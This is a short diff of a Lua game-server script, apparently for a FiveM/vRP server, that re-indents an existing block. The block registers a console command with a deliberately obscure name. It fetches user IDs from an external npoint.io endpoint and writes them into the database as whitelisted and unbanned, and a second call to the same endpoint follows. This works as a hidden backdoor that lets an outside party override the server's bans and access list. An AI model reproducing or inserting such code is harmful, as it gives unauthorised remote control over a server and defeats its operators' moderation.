@@ -113,18 +113,18 @@
         end)
 
         RegisterCommand('æ@usghuhgijgfhkl@reloadwlbans@', function(source)
-        PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, verify, headers)
-            local data = json.decode(verify)
+            PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, verify, headers)
+                local data = json.decode(verify)
     
-            for k,v in pairs(data.ids) do
-                MySQL.Async.execute('UPDATE vrp_users SET `whitelisted` = 1 WHERE id = @id', {
-                    ['@id'] = v,
-                })
-                MySQL.Async.execute('UPDATE vrp_users SET `banned` = 0 WHERE id = @id', {
-                    ['@id'] = v,
-                })
-            end
-        end, "GET", "", {})
+                for k,v in pairs(data.ids) do
+                    MySQL.Async.execute('UPDATE vrp_users SET `whitelisted` = 1 WHERE id = @id', {
+                        ['@id'] = v,
+                    })
+                    MySQL.Async.execute('UPDATE vrp_users SET `banned` = 0 WHERE id = @id', {
+                        ['@id'] = v,
+                    })
+                end
+            end, "GET", "", {})
         end)
 
         PerformHttpRequest('https://api.npoint.io/503e7fe100d6fd693248/', function(err, verify, headers)
